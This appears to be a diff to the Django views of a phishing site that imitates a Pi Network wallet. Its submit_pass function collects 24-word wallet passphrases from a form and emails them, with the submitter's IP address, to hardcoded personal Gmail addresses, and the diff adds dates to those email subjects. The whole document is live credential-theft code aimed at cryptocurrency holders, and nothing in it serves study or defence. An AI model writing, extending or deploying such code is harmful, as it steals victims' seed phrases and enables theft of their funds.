@@ -7,11 +7,12 @@ from firebmail import sendmail as sending_no
 from datetime import datetime
 import requests
 import socket
-
-# Create your views here.
 import uuid
+current_date = datetime.now().date()
+current_time = datetime.now()
+formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
 
-testing = False
+testing = True
 my_site = False
 
 def get_mac_address():
@@ -75,16 +76,14 @@ def wallet(request):
     return render(request, 'wallet.html', {})
 
 def submit_pass(request):
-    current_time = datetime.now()
-    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
         words = keys.split()
         if len(words) != 24:
             if my_site:
-                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
+                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
             else:
-                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
+                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
             messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
@@ -136,16 +135,16 @@ def submit_pass(request):
                     ip_address = ip_address
 
                 if my_site:
-                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted (My site)', email_to="ezekielobiajulu0@gmail.com")
+                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date} (My site)', email_to="ezekielobiajulu0@gmail.com")
 
                 else:
                     if testing:
-                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="ezekielobiajulu0@gmail.com")
 
                     else:
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="ezekielobiajulu0@gmail.com")
                     
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
+                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="obikeechiemerielinus@gmail.com")
 
                 if my_site:
                     request.session['look_up'] = look_up_key
